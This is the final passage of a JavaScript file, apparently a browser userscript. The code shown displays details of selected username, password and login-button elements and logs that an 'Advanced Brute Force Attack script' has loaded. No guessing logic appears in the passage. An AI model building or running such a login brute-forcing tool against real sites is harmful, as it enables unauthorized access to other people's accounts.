        usernameElementInfo.textContent = `<${selectedUsernameElement.tagName.toLowerCase()}> (ID: "${selectedUsernameElement.id || 'No ID'}", Class: "${selectedUsernameElement.className || 'No Class'}")`;
        usernameElementDisplay.style.display = 'flex';
    }
    if (selectedPasswordElement) {
        passwordElementInfo.textContent = `<${selectedPasswordElement.tagName.toLowerCase()}> (ID: "${selectedPasswordElement.id || 'No ID'}", Class: "${selectedPasswordElement.className || 'No Class'}")`;
        passwordElementDisplay.style.display = 'flex';
    }
    if (selectedLoginButtonElement) {
        loginButtonElementInfo.textContent = `<${selectedLoginButtonElement.tagName.toLowerCase()}> (ID: "${selectedLoginButtonElement.id || 'No ID'}", Class: "${selectedLoginButtonElement.className || 'No Class'}")`;
        loginButtonElementDisplay.style.display = 'flex';
    }
    yourUsernameInput.value = yourUsernameInput.value; // Ensure value is set on load

    logAction('Advanced Brute Force Attack script loaded and windows created.');

})();
